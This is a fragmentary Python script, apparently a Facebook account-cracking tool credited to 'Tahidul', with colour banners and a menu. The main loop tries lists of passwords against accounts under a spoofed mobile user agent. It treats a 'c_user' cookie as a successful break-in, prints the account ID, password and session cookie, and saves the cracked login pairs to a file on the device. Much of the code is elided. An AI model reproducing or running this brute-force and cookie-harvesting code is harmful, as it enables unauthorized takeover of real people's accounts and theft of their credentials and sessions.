...
ha = current.day
today = date.today()
#Tahidul2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mTahidul')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-Tahidul/1.2.0 OPN-B'
...
┏┳┓┏┓┓┏┳┳┓┳┳┓ 
 ...
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mTahidul \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mRajib HASAN \033[1;92m     |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100094924672100')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio Tahidul_OK.mp3")
                print('\033[1;92m[Tahidul-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Tahidul-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mTahidul","\x1b[1;92mTahidul","\x1b[1;93mTahidul","\x1b[1;94mTahidul","\x1b[1;95mTahidul","\x1b[1;96mTahidul","\x1b[1;97mTahidul","\x1b[1;91mTahidul","\x1b[1;92mTahidul","\x1b[1;93mTahidul","\x1b[1;94mTahidul","\x1b[1;95mTahidul","\x1b[1;96mTahidul"])
